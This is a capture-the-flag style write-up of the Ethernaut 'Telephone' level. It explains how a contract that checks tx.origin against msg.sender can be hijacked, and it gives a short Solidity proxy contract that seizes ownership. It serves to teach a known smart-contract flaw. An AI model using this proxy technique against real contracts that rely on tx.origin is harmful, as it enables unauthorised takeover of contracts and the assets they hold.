---
layout: writeup
title: "Telephone"
level: "Beginner"
category: "Ethernaut"
description: "Exploit the difference between tx.origin and msg.sender to bypass ownership checks."
---

## Analysis

The vulnerability in the `Telephone` contract lies in this line:
`if (tx.origin != msg.sender) { owner = _owner; }`

To understand why this is a flaw, we must distinguish between the two global variables:
* **msg.sender**: The direct address that called the function.
* **tx.origin**: The original external account (EOA) that started the transaction.



**The Flaw:**
If you call the `Telephone` contract directly, `tx.origin` and `msg.sender` are the same (your wallet). However, if you use an intermediary **Attacker Contract**, `msg.sender` becomes the address of that contract, while `tx.origin` remains your wallet address.

---

## Solution

To trigger the ownership change, you need to create a simple proxy contract that calls the `changeOwner` function.

---

## Attacker Contract (Solidity)

<pre class="plain-code"><code>
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ITelephone {
    function changeOwner(address _owner) external;
}
contract TelephoneAttacker {
    ITelephone public target;
    constructor(address _target) {
        target = ITelephone(_target);
    }
    function attack(address _newOwner) public {
        // This call makes msg.sender = this contract's address
        // But tx.origin = your wallet address
        target.changeOwner(_newOwner);
    }
}
</code></pre>

---